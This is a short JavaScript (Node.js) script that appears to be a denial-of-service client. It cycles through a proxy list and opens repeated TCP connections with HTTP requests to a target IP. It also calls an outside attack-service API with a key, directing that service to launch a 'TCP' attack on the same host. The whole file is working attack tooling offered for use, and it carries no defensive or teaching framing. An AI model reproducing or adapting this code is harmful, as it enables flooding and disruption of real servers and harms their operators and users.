const net = require('net');
const fs = require('fs');
const axios = require('axios');

// Load proxy list from file
const proxies = fs.readFileSync('Proxy.txt', 'utf-8').toString().trim().split('\n');

// API endpoint and request parameters
const apiEndpoint = 'http://170.64.166.87:8080/api/start-attack'; // Adjust the URL if necessary

// Read command line arguments
const [,, host = '152.42.247.134', port = 443, time = 60] = process.argv;
const targetPort = parseInt(port, 10);
const attackTime = parseInt(time, 10);

// Function to start an attack
async function startAttack(host, port, time) {
    try {
        const response = await axios.post(apiEndpoint, {
            keyFromQuery: '@lizardpredator',
            host: host,
            port: port,
            time: time,
            method: 'TCP'
        });
        console.log('Attack response:', response.data);
    } catch (error) {
        console.error('Error starting attack:', error);
    }
}

function createTCPConnection() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const proxyHost = proxy[0];
    const proxyPort = proxy[1];

    const socket = net.connect(proxyPort, proxyHost);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(5000);

    // Send request to start attack
    startAttack(host, targetPort, attackTime);

    socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
    socket.on('data', () => {
        setTimeout(() => {
            socket.destroy();
        }, 5000);
    });
}

// Create connections periodically
setInterval(createTCPConnection, 10000); // Adjust interval as needed
